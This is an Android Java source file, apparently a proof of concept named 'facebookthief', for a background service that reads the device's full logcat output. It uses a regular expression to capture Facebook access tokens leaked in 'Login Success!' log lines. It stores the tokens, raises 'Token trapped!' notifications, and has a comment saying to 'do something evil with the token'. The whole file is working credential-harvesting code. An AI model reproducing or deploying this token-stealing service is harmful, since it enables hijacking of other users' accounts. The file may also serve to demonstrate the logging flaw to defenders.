package com.pixplicity.example.facebookthief;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.util.ArrayList;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

import android.app.Notification;
import android.app.NotificationManager;
import android.app.PendingIntent;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.net.Uri;
import android.os.IBinder;
import android.util.Log;
import android.widget.ArrayAdapter;
import android.widget.ListView;

public class TrapperService extends Service {

	private static TrapperService mInstance;

	private static Thread mThread;
	private TrapperActivity mActivity;

	private final ArrayList<TrapperResult> mTokens = new ArrayList<TrapperResult>();

	public static TrapperService getInstance(TrapperActivity activity) {
		if (mInstance != null) {
			mInstance.setActivity(activity);
		}
		return mInstance;
	}

	@Override
	public IBinder onBind(Intent intent) {
		return null;
	}

	@Override
	public void onCreate() {
		Log.i(TrapperActivity.TAG, "starting service");
		// The service is first created
		int id = 0;
		startForeground(id, showNotification(id, "Facebook Trapper running"));
		if (mThread == null || !mThread.isAlive()) {
			mThread = new Thread() {
				int count = 0;
				Pattern pattern =
						Pattern.compile("Login Success! access_token=([^\\s]+)");

				@Override
				public void run() {
					Process process = null;
					BufferedReader reader = null;
					try {
						process = Runtime.getRuntime().exec(
								new String[] { "logcat",
										"*:V" });
						// Read the process stream
						reader = new BufferedReader(new InputStreamReader(
								process.getInputStream()),
								1024);
						while (!isInterrupted()) {
							final String line = reader.readLine();
							if (line == null) {
								break;
							}
							handleLine(line);
							// Short delay to prevent locking up
							Thread.sleep(10);
						}
					} catch (IOException e) {
						Log.e(TrapperActivity.TAG, e.getMessage());
						// Something went wrong; abort
					} catch (InterruptedException e) {
						// Stop thread
					} finally {
						if (process != null) {
							process.destroy();
						}
						if (reader != null) {
							try {
								reader.close();
							} catch (IOException e) {
							}
						}
					}
					Log.i(TrapperActivity.TAG, "service stopped");
					showNotification(-1, "Facebook Trapper stopped");
				}

				public void handleLine(final String line) {
					Matcher match = pattern.matcher(line);
					if (match.find()) {
						String token = match.group(1);
						TrapperResult result = new TrapperResult(line, token);
						showNotification(++count, "Token trapped!", result);
						Log.i(TrapperActivity.TAG, "token trapped");
						synchronized (mTokens) {
							mTokens.add(result);
						}
						// TODO Do something evil with the token
						// Update the list
						updateActivity();
					}
				};
			};
			mThread.start();
		}
		mInstance = this;
	}

	@Override
	public void onDestroy() {
		// The service is shutting down
		stop();
	}

	public void stop() {
		Log.i(TrapperActivity.TAG, "stopping service");
		mThread.interrupt();
		stopForeground(true);
	}

	@Override
	public int onStartCommand(Intent intent, int flags, int startId) {
		return super.onStartCommand(intent, flags, startId);
	}

	public void setActivity(TrapperActivity activity) {
		mActivity = activity;
		updateActivity();
	}

	protected void updateActivity() {
		if (mActivity != null) {
			final ListView list = mActivity.getList();
			list.post(new Runnable() {
				@Override
				public void run() {
					ArrayAdapter<TrapperResult> adapter =
							(ArrayAdapter<TrapperResult>) list.getAdapter();
					adapter.clear();
					synchronized (mTokens) {
						for (int i = Math.max(0, mTokens.size()
								- TrapperActivity.MAX_ITEMS); i < mTokens
								.size(); i++) {
							adapter.add(mTokens.get(i));
						}
					}
				}
			});
		}
	}

	protected Notification showNotification(int id, String title) {
		return showNotification(id, title, null);
	}

	protected Notification showNotification(int id, String title,
			TrapperResult result) {
		NotificationManager ns = (NotificationManager) getSystemService(Context.NOTIFICATION_SERVICE);
		Notification notification = new Notification(
				R.drawable.ic_launcher, title,
				System.currentTimeMillis());
		boolean cancel = false;
		if (id < 0) {
			id = 0;
			cancel = true;
		}
		final Intent intent;
		if (id == 0) {
			intent = new Intent(this, TrapperActivity.class);
			notification.flags |= Notification.FLAG_ONGOING_EVENT;
			notification.icon = R.drawable.ic_service;
		} else {
			intent = result.getIntent();
			notification.sound = Uri.parse("android.resource://"
					+ getPackageName() + "/" + R.raw.alarm);
			notification.icon = R.drawable.ic_security;
		}
		PendingIntent contentIntent = PendingIntent
				.getActivity(this, 0, intent, 0);
		notification.setLatestEventInfo(this, title, result == null ? null
				: result.interest, contentIntent);
		ns.notify(id, notification);
		if (cancel) {
			ns.cancel(id);
		}
		return notification;
	}

	public boolean isAlive() {
		return mThread != null && mThread.isAlive();
	}

}
